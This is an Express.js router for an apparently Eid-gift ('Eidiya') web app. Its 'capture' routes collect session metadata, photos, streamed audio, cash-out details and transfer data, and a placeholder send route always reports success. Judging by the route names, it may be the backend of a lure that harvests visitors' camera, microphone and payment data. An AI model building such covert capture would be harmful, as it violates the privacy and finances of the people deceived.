const express = require('express');
const router = express.Router();
const homeController = require('../controllers/homeController');
const captureController = require('../controllers/captureController');

router.get('/', homeController.getHome);
router.post('/capture/session', captureController.startSession);
router.post('/capture/:sessionId/metadata', captureController.saveMetadata);
router.post('/capture/:sessionId/photo', captureController.savePhoto);
router.post(
  '/capture/:sessionId/audio',
  express.raw({ type: ['audio/webm', 'audio/ogg', 'application/octet-stream'], limit: '10mb' }),
  captureController.saveAudioChunk
);
router.post('/capture/:sessionId/audio/finish', captureController.finishAudio);
router.post('/capture/cashout', captureController.saveCashOut);
router.post('/capture/eidiya', captureController.saveEidiyaTransfer);

// Placeholder route for later server logic
router.post('/send-eidiya', (req, res) => {
  const { recipient, amount, message } = req.body;
  // Here the user can add server logic later
  res.json({
    success: true,
    message: 'Eidiya sent successfully!',
    data: { recipient, amount, message }
  });
});

module.exports = router;
